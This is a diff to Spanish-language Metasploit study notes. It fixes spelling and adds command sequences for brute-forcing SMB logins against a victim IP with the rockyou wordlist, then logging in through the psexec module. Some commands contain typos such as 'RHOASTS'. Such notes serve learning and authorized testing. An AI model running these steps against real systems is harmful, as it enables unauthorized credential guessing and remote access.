@@ -1,9 +1,9 @@
-metaesploit es una herramienta muy potente que permite explotar vulneravilibidades conocidas en una maquina
+metaesploit es una herramienta muy potente que permite explotar vulnerabilidades conocidas en una maquina
 
 
 
 ## arrancar metasploit
-Menu Inicio / metasplot (de esta forma se actualizan las Bases de datos de metaesploit)
+Menú Inicio / metasplot (de esta forma se actualizan las Bases de datos de metaesploit)
 
 
 ## search {vulnerabilidad}
@@ -42,7 +42,7 @@ msf6 exploit({exploti seleccionado}) > show options
 El payload es lo que se va a ejecutar cuando el exploit consiga acceso a la maquina
 
 
-## Configurar parametros del exploit
+## Configurar parámetros del exploit
 
 ```sh title:"metasploit, configurar parametros"
 msf6 exploit({exploti seleccionado})> set {parametroname} [parametro valor] 
@@ -59,4 +59,34 @@ msf6 exploit({exploti seleccionado})> run
 
 ```sh title:"metasploit, ejecutar metasploit"
 msf6 exploit({exploti seleccionado})> exploit
+```
+
+
+
+## Fuerza bruta con metasploit a SMB
+
+
+```sh title:"metasploit, ejecutar fuerza bruta al protocolo SMB"
+msf6 > use auxiliary/scanner/smb/smb_login
+# hacer atraques de fuerza bruta
+show options
+set RHOASTS {IP Victima}
+set VERBOSE false
+set SMBUSER {usuarioConocido}
+set PASS_FILE usr/share/wordlists/rockyou.txt
+show options
+run
+```
+
+## Intentar hacer login con psexec
+```sh title:"metasploit, SMB intentar hacer login con PSEXEC"
+msf6 > use exploit/windows/smb/psexec
+# hacer atraques de fuerza bruta
+show options
+set RHOASTS {IP Victima}
+set VERBOSE false
+set SMBUSER {usuarioConocido}
+set SMBPASS {password encontrado con fuerza bruta}
+show options
+run
 ```
